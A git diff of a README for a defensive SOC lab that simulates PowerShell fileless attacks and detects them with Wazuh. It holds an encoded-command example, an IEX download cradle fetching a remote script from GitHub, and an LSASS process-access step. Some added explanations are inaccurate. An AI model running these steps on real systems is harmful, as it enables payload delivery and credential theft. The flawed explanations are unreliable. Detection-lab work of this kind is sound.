@@ -1,7 +1,6 @@
 # 🛡️ SOC Project 2: Fileless Attack Detection with Sysmon + Wazuh
 
 ![Wazuh](https://img.shields.io/badge/SIEM-Wazuh-blue?style=for-the-badge&logo=data:image/png;base64,)
-![Sysmon](https://img.shields.io/badge/Telemetry-Sysmon-orange?style=for-the-badge)
 ![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red?style=for-the-badge)
 ![Windows](https://img.shields.io/badge/Platform-Windows%2011-0078D6?style=for-the-badge&logo=windows)
 ![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
@@ -11,7 +10,7 @@
 
 ## 📌 Project Overview
 
-This project simulates real-world **PowerShell-based fileless attacks** and **Living-off-the-Land (LotL)** techniques against a Windows 11 endpoint, then detects them using **Sysmon telemetry** forwarded to a **Wazuh SIEM**. 
+This project simulates real-world **PowerShell-based fileless attacks** and **Living-off-the-Land (LotL)** techniques against a Windows 11 endpoint, then detects them using **Agent** forwarded to a **Wazuh SIEM**. 
 
 The goal is to replicate a Tier 1 SOC analyst workflow: understand the attack, observe the telemetry, triage the alert, and document findings — all mapped to the **MITRE ATT&CK framework**.
 
@@ -25,8 +24,6 @@ The goal is to replicate a Tier 1 SOC analyst workflow: understand the attack, o
 |-----------|---------|
 | **SIEM** | Wazuh 4.x (Docker on WSL2) |
 | **Endpoint Agent** | Windows 11 — Wazuh Agent (windows-host) |
-| **Telemetry Source** | Sysmon with SwiftOnSecurity config |
-| **PS Logging** | Script Block Logging + Module Logging enabled |
 | **Attack Method** | Native PowerShell (Living-off-the-Land) |
 | **Total Alerts Generated** | 1,180 security events |
 
@@ -35,6 +32,7 @@ The goal is to replicate a Tier 1 SOC analyst workflow: understand the attack, o
 ## ⚔️ Attacks Simulated
 
 ### Attack 1 — Encoded PowerShell Command `T1059.001`
+This attack is used to encode malicious commands, like instead of "delete files" attacker encode it to "DWDWDodw..." like this.
 Encoded a command string using Base64 and executed it via `-EncodedCommand` flag — a common technique attackers use to **obfuscate malicious commands** from basic security tools.
 
 ```powershell
@@ -47,6 +45,7 @@ powershell.exe -EncodedCommand $encoded
 ---
 
 ### Attack 2 — PowerShell Download Cradle / IEX `T1105`
+This attack is also called as fileless attack, in this attack files execute and malicious files run without saving into memory.
 Attempted to download and execute a script directly in memory using `IEX` + `Net.WebClient` — the classic **fileless payload delivery** technique that avoids writing anything to disk.
 
 ```powershell
@@ -57,7 +56,8 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ---
 
 ### Attack 3 — LSASS Memory Access `T1003.001`
-Opened a handle to the **LSASS process** (Windows password vault) — simulating the first step of credential dumping tools like Mimikatz.
+Local Security Authority Subsystem Services, windows passwords vault, which store all paswords in memory, used to dump passwords and credentials.
+Opened a handle to the **LSASS process** (Windows password vault) — simulating the first step of credential dumping tools like Mimikatz (open-source post-exploitation tool for Windows that extracts sensitive authentication credentials directly from memory).
 
 ```powershell
 $lsass = Get-Process lsass
@@ -77,26 +77,26 @@ Write-Host "Triggered - LSASS PID: $($lsass.Id)"
 ---
 
 ### Rule 91815 — PowerShell Process Discovery (T1057)
-![Rule 91815 Alert](screenshots/Security_Events_rule_91815.png)
+
 > Triggered by Attack 3 (LSASS access). Wazuh captured the exact scriptBlockText showing `Get-Process lsass` command.
 
 ---
 
 ### Rule 91816 — PowerShell System Info Discovery (T1082)
-![Rule 91816 Alert](screenshots/Security_Events_rule_91816.png)
+
 > Triggered by Attack 1 (Encoded command). Wazuh captured Event ID 4104 from PowerShell/Operational log channel.
 
 ---
 
 ### Rule 62123 — Windows Defender: Malware Blocked (Level 12)
-![Rule 62123 Alert](screenshots/Security_Events_rule_62123.png)
+
 > Triggered by Attack 2 (Download Cradle). Defender identified `Trojan:PowerShell/Powersploit.C` via AMSI scanning. Execution status: **Suspended**.
 
 ---
 
 ### PowerShell — Attack 2 Blocked by Defender
-![PowerShell Attack Blocked](screenshots/Power_shell_Attacks.png)
-> Real terminal output showing the `ScriptContainedMaliciousContent` block — a defensive layer working as expected.
+
+>Output showing the `ScriptContainedMaliciousContent` block — a defensive layer working as expected, screenshot is attached.
 
 ---
 
@@ -134,7 +134,6 @@ See full mapping → [MITRE-mapping.md](MITRE-mapping.md)
 | Tool | Purpose |
 |------|---------|
 | Wazuh 4.x | SIEM — log collection, alerting, dashboards |
-| Sysmon (SwiftOnSecurity config) | Deep Windows endpoint telemetry |
 | PowerShell Script Block Logging | Captures all PS commands (Event ID 4104) |
 | Windows Defender / AMSI | Endpoint protection layer |
 | Docker + WSL2 | Wazuh deployment environment |
@@ -142,33 +141,10 @@ See full mapping → [MITRE-mapping.md](MITRE-mapping.md)
 
 ---
 
-## 📁 Repository Structure
-
-```
-SOC-Sysmon-PowerShell-Detection/
-├── README.md
-├── MITRE-mapping.md
-├── config/
-│   └── sysmon-config.xml
-├── attack-simulations/
-│   ├── 01-encoded-powershell.md
-│   ├── 02-download-cradle.md
-│   └── 03-lsass-access.md
-└── screenshots/
-    ├── Wazuh_dashboard.png
-    ├── MITRE_ATTACK_Dashboard.png
-    ├── Power_shell_Attacks.png
-    ├── Security_Events_rule_91815.png
-    ├── Security_Events_rule_91816.png
-    └── Security_Events_rule_62123.png
-```
-
----
-
 ## 🎯 SOC Analyst Skills Demonstrated
 
 - ✅ SIEM deployment and agent configuration (Wazuh + Windows)
-- ✅ Endpoint telemetry setup (Sysmon + PowerShell logging)
+- ✅ Endpoint telemetry setup ( PowerShell logging)
 - ✅ Attack simulation using native OS tools (LotL techniques)
 - ✅ Alert triage and investigation workflow
 - ✅ MITRE ATT&CK framework mapping
@@ -188,5 +164,3 @@ Self-learning cybersecurity | Blue Team focused | Based in Pakistan
 [![Blog](https://img.shields.io/badge/Blog-munazajameel.site-orange?style=flat)](https://munazajameel.site/blog)
 
 ---
-
-> 🔗 **Next Project:** [Project 3 — Custom Wazuh Rule Engineering](coming soon)
